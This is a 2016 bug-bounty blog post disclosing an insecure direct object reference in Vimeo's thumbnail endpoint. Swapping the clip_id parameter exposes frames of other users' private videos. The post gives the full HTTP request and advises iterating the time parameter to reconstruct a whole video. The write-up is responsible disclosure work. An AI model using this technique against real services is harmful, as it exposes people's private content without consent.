---
title: Abusing Thumbnails to see Vimeo private video
date: 2016-05-11 00:00:00 +02:00
categories:
- IDOR
- Privacy
layout: post
excerpt: https://vimeo.com/upload/select_thumb uri is used set a thumbnails on your
  vimeo video. https://vimeo.com/upload/.............
comments: true
---

https://vimeo.com/upload/select_thumb URL is used to set thumbnails to your Vimeo video. https://vimeo.com/upload/select_thumb URL request is composed of 3 parameter clip_id, token, and time. clip_id parameter is used to select a video you want to get a thumbnail, the token is an anti-CSRF token and time parameter is the time frame of the video you selected.

I changed the value of clip_id parameter to another video id to test some authorization flaw, it seems, it works because I got HTTP/1.1 200 OK and I short JSON response that contains a URL, like this one

```
{"success":true,"id":503302458,"url":"https:\/\/i.vimeocdn.com\/video\/503302458_100x75.jpg"}
```


To confirm this is an authorization flaw, I make an another account and upload a private video on that account and get the clip_id then make an HTTP request (https://vimeo.com/upload/select_thumb) to my attacker account using that clip_id. as a result, I got some thumbnails on a private video.

To get the whole video just iterate the time parameter!


## HTTP Request of vulnerable endpoint
{% highlight text %}
POST /upload/select_thumb HTTP/1.1
Host: vimeo.com
Connection: keep-alive
Content-Length: 101
Accept: application/json
Origin: https://vimeo.com
X-Requested-With: XMLHttpRequest
X-Request: JSON
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: https://vimeo.com/116730756/settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4
Cookie: optimizelyEndUserId=oeu1421174571879r0.30598339810967445; vimeo_cart=%7B%22pro%22%3A%7B%22store%22%3A%22pro%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433857%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433857%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D%7D; ki_t=1421174596820%3B1421174596820%3B1421174632154%3B1%3B2; ki_r=; optimizelySegments=%7B%22198520930%22%3A%22direct%22%2C%22199004622%22%3A%22gc%22%2C%22199138489%22%3A%22false%22%2C%22213082152%22%3A%22none%22%2C%22222271074%22%3A%22true%22%7D; optimizelyBuckets=%7B%7D; language=en; clips=116730756%2C116213689; auto_load_stats=1; has_logged_in=1; stats_start_date=2015%2F01%2F11; stats_end_date=2015%2F01%2F15; site_settings=%7B%22sticky_page%22%3A%22%5C%2Fmyvideos%22%2C%22browse_format_vid%22%3A%22video%22%7D; stream_id=Y2xpcHM6MzYzNzIzODc6aWQ6ZGVzYzpbXQ%3D%3D; stream_pos=1; orphaned_upload_clip_ids_v2=%5B116730663%2C116730664%5D; vuid=971609171.1881657208; _utma=18302654.1379178336.1421173781.1421184208.1421253399.5; _utmb=18302654.28.9.1421253997197; __utmc=18302654; __utmz=18302654.1421174705.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _utmv=18302654.|2=usertype=basic=1^3=ms=0=1^7=video_count=0=1; vimeo=epk9krxkmr70pcdxcxxsctd7jpcdxcxmkxrx7%2Cpfftk0tftdd0fdcmvx9x92rmksckx5rrfww5dwrvv; player=""; xsrft=d816974227fe3684c41a8501f333679f.61b1f2e5e1df9aeb29e02acf641d99a9

clip_id=9digitid&token=TOKEN_HERE&time=51.283

{% endhighlight %}

**Original Report:** [Hackerone](https://hackerone.com/reports/43850)
